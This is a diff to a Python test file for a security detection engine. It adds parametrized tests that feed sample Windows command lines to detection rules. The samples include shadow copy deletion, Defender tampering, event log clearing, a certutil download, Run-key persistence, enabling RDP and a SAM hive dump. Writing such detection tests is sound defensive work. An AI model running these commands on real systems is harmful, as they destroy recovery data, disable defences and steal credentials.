@@ -2,6 +2,8 @@ import json
 import uuid
 from datetime import datetime, timedelta
 
+import pytest
+
 from app.analysis.risk import compute_risk
 from app.detection.engine import run_detection
 from app.models import Detection, Event, Incident
@@ -299,7 +301,7 @@ def _scriptblock(text, minutes=0):
 
 
 def test_all_yaml_rules_loaded_with_attack_tags():
-    assert len(RULES) == 9
+    assert len(RULES) == 18
     assert all(r.technique_ids and 1 <= r.severity <= 10 for r in RULES)
 
 
@@ -324,3 +326,27 @@ def test_allowlist_does_not_suppress_appended_payload(db_session):
 
     detection = db_session.query(Detection).filter(Detection.rule_name == "Suspicious PowerShell script block").one()
     assert detection.event_count == 2
+
+
+# One positive 4688 command line per v2 rule.
+@pytest.mark.parametrize(
+    "rule_name, command_line",
+    [
+        ("Shadow copy deletion", "vssadmin.exe delete shadows /all /quiet"),
+        ("Defender tampering", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"),
+        ("Event log clear command", "wevtutil cl Security"),
+        ("File download via LOLBin", "certutil.exe -urlcache -split -f http://x/a.exe a.exe"),
+        ("Service created with sc.exe", r'sc.exe create evilsvc binPath= "C:\temp\e.exe"'),
+        ("RDP enabled via registry", r'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'),
+        ("Run key persistence", r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upd /d C:\temp\e.exe"),
+        ("Hidden PowerShell with execution policy bypass", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File x.ps1"),
+        ("Credential dumping", r"reg save HKLM\SAM C:\temp\sam.save"),
+    ],
+)
+def test_command_line_rule_detected(db_session, rule_name, command_line):
+    db_session.add(_event(4688, command_line=command_line))
+    db_session.commit()
+
+    run_detection(db_session)
+
+    assert rule_name in _rule_names(db_session)
